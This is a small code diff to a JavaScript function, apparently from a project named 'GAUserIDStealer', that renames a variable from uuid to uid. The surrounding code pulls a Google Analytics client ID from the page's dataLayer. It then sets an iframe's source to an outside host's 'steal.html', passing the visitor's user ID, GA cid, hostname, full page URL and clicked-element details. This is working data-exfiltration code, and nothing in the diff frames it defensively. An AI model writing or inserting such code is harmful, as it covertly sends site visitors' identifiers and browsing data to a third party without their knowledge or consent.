@@ -54,11 +54,11 @@ function doFlow(){
         
     });
 
-    uuid=-1
+    uid=-1
     for(i=0;i<dataLayer.length;i++){
         try{
             if('ga_c_id' in dataLayer[i]){
-                uuid=dataLayer[i]['ga_c_id'];
+                uid=dataLayer[i]['ga_c_id'];
                 break;
             }
         }catch(e){
@@ -130,5 +130,5 @@ function doFlow(){
         }
     }
 
-    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
 }
